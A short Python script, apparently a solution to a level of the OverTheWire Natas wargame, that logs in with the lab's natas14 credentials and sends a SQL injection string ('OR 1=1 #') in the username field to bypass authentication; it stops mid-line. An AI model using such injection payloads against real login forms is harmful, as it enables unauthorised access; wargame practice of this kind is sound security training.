#!/user/bin/env python
import requests
import  re
import base64
import urllib

username = 'natas14'
password = 'qPazSJBmrmU7UQJv17MHk1PGC4DxZMEP'

url ='http://%s.natas.labs.overthewire.org/?debug=true' % username
session = requests.Session()

#reponse = session.get(url , auth = (username, password))
reponse = session.post(url , data={"username" :'please" OR 1=1 #',"password" : "subscribe"},auth = (username, password))
content = reponse.text
print(content)
#print (re.findall('The password for natas12 is